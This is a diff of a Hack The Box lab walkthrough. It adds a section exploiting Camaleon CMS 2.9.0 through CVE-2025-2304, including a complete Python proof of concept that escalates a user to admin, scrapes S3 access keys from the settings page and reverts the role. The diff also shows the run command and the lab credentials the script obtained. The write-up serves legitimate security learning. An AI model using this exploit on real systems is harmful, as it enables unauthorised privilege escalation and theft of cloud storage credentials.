@@ -261,21 +261,210 @@ While exploring the admin panel, I noticed something very useful in the page con
 
 This discovery was a key turning point, because identifying the CMS allowed me to search for known vulnerabilities and exploitation paths.
 
-![Alt text](../assets/htb/facts/13.png)
+![Alt text](../assets/htb/facts/14.png)
 
 ---
 
-## 6. The Plot Twist: MinIO Appears
+<style>
+.critical {
+    
+                display: inline-block;
+                outline: 0;
+                cursor: pointer;
+                border-radius: 999px;
+                border: 2px solid #ff4742;
+                color: #ff4742;
+                background: 0 0;
+                padding: 8px;
+                box-shadow: rgba(0, 0, 0, 0.07) 0px 2px 4px 0px, rgba(0, 0, 0, 0.05) 0px 1px 1.5px 0px;
+                font-weight: 800;
+                font-size: 10px;
+                height: 30px;
+                
+                
+}
 
-Port 54321 reveals MinIO S3-compatible storage.
+</style>
 
-So now the machine evolves into:
+## 6. CMS Exploit → Credential Leak (CVE-2025-2304 <span class="critical">HIGH</span>)
 
-Web App → NoSQLi → Cloud Storage → Pain
+After confirming the admin panel was running **Camaleon CMS**, the next step was obvious: check if this version has any known vulnerabilities.
 
----
+Inside the dashboard (and sometimes even in the page source/footer), the CMS version was exposed. Once I had the version, I did the classic pentester Google-dorking ritual:
 
-## CMS Exploit → Credential Leak
+- search for `Camaleon CMS 2.9.0 exploit`
+- check GitHub PoCs
+- check CVE databases
+- check Exploit-DB
+
+And of course, because this is HTB and the universe loves predictable suffering, Camaleon CMS was vulnerable to a privilege escalation vulnerability.
+
+I found a public exploit for:
+
+**CVE-2025-2304 — Camaleon CMS 2.9.0 Authenticated Privilege Escalation**
+
+![Alt text](../assets/htb/facts/15.png)
+
+The exploit was available on GitHub:
+
+[https://github.com/Alien0ne/CVE-2025-2304](https://github.com/Alien0ne/CVE-2025-2304)
+
+```python
+
+#Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
+
+import argparse
+import requests
+import re
+import sys
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-u", "--url", required=True, help="URL")
+parser.add_argument("-U", "--username", required=True, help="Username")
+parser.add_argument("-P", "--password", required=True, help="Password")
+parser.add_argument("--newpass", default="test", help="New password to set")
+parser.add_argument("-e", "--extract", action="store_true", help="Extract AWS Secrets")
+parser.add_argument("-r", "--revert", action="store_true",help="Revert role back to client after escalation")
+
+args = parser.parse_args()
+
+print("[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)")
+
+s = requests.Session()
+
+#-------Login-------
+
+r = s.get(f"{args.url}/admin/login")
+
+#CSRF Extraction
+m = re.search(r'<input type="hidden" name="authenticity_token" value="([^"]*)"',r.text)
+csrf=m.group(1)
+#print(f"Login CSRF extracted: {csrf}")
+
+#Login Post Req
+data={
+    "authenticity_token":csrf,
+    "user[username]": args.username,
+    "user[password]": args.password
+}
+
+r = s.post(f"{args.url}/admin/login", data=data)
+if "/admin/logout" in r.text:
+    print("[+]Login confirmed")
+else:
+    print("[-]Login failed")
+    exit()
+
+#Profile Edit GET Req
+
+r = s.get(f"{args.url}/admin/profile/edit")
+
+m = re.search(r'<meta name="csrf-token" content="([^"]*)"[^>]*',r.text)
+csrf=m.group(1)
+#print(f"Login CSRF extracted: {csrf}")
+
+m = re.search(r'<input[^>]*value="([^"]*)"[^>]*id="user_id"[^>]*',r.text)
+user_id = m.group(1)
+print(f"   User ID: {user_id}")
+
+'''m = re.search(r'<input[^>]*value="([^"]*)"[^>]*id="user_email"[^>]*',r.text)
+user_email = m.group(1)
+print(f"User Email: {user_email}")'''
+
+m = re.search(r'<option selected="selected" value="([^"]*)">',r.text)
+user_role = m.group(1)
+print(f"   Current User Role: {user_role}")
+
+print("[+]Loading PPRIVILEGE ESCALATION")
+
+#PPRIVILEGE ESCALATION
+
+data={
+    "_method":"patch",
+    "authenticity_token":csrf,
+    "password[password]": args.newpass,
+    "password[password_confirmation]": args.newpass,
+    "password[role]": "admin"
+}
+
+headers={
+    "X-CSRF-Token":csrf,
+    "X-Requested-With": "XMLHttpRequest"
+}
+
+r = s.post(f"{args.url}/admin/users/{user_id}/updated_ajax", data=data, headers=headers)
+
+#Role Verification
+
+r = s.get(f"{args.url}/admin/profile/edit")
+
+m = re.search(r'<input[^>]*value="([^"]*)"[^>]*id="user_id"[^>]*',r.text)
+user_id = m.group(1)
+print(f"   User ID: {user_id}")
+
+m = re.search(r'<option selected="selected" value="([^"]*)">',r.text)
+updated_user_role = m.group(1)
+print(f"   Updated User Role: {updated_user_role}")
+
+if args.extract:
+    print("[+]Extracting S3 Credentials")
+
+    r = s.get(f"{args.url}/admin/settings/site")
+
+    m = re.search(r'<input[^>]*value="([^"]*)"[^>]*options_filesystem_s3_access_key[^>]*',r.text)
+    s3_access_key = m.group(1)
+    print(f"   s3 access key: {s3_access_key}")
+
+    m = re.search(r'<input[^>]*value="([^"]*)"[^>]*options_filesystem_s3_secret_key[^>]*',r.text)
+    s3_secret_key = m.group(1)
+    print(f"   s3 secret key: {s3_secret_key}")
+
+    m = re.search(r'<input[^>]*value="([^"]*)"[^>]*options_filesystem_s3_endpoint[^>]*',r.text)
+    s3_endpoint = m.group(1)
+    print(f"   s3 endpoint: {s3_endpoint}")
+
+#Reverting users Role
+
+print("[+]Reverting User Role")
+if args.revert:
+    r = s.get(f"{args.url}/admin/profile/edit")
+
+    m = re.search(r'<meta name="csrf-token" content="([^"]*)"[^>]*',r.text)
+    csrf=m.group(1)
+
+    data={
+        "_method":"patch",
+        "authenticity_token":csrf,
+        "password[password]": args.newpass,
+        "password[password_confirmation]": args.newpass,
+        "password[role]": user_role
+    }
+
+    headers={
+        "X-CSRF-Token":csrf,
+        "X-Requested-With": "XMLHttpRequest"
+    }
+
+    r = s.post(f"{args.url}/admin/users/{user_id}/updated_ajax", data=data, headers=headers)
+
+    #Role Verification
+
+    r = s.get(f"{args.url}/admin/profile/edit")
+
+    m = re.search(r'<input[^>]*value="([^"]*)"[^>]*id="user_id"[^>]*',r.text)
+    user_id = m.group(1)
+    print(f"   User ID: {user_id}")
+
+    m = re.search(r'<option selected="selected" value="([^"]*)">',r.text)
+    user_role = m.group(1)
+    print(f"   User Role: {user_role}")
+
+
+```
+
+This exploit allows a low-privileged authenticated user to escalate their role to admin, extract sensitive configuration, and revert back to normal, leaving the system thinking everything is fine (like a polite hacker).
+
+Since I already had a registered account (`mensi:mensi`), exploitation was straightforward.
 
 We run:
 
@@ -283,7 +472,7 @@ We run:
 python3 CVE-2025-2304.py -u http://facts.htb -U mensi -P mensi -e -r
 ```
 
-We get:
+The script successfully authenticated, temporarily promoted the user role, and extracted the S3 configuration used by the CMS:
 
 ```
 s3 access key: AKIAD9A2F65061D176AF
@@ -291,8 +480,11 @@ s3 secret key: a46pdJHQvIaJtTiT99lHFX3i9m2wOPXrSoO6KLJC
 s3 endpoint: http://localhost:54321
 ```
 
-At this point:
-The machine basically hands us the keys and says “please leave me alone”.
+This was a major breakthrough because Camaleon CMS was configured to store uploaded content using an **S3-compatible backend**, and in this case that backend was **MinIO**, running locally on port `54321`.
+
+So instead of needing to attack the MinIO service blindly, the CMS basically leaked its storage credentials like a confession letter.
+
+At this point, the machine basically hands us the keys and says “please leave me alone”.
 
 ---
 
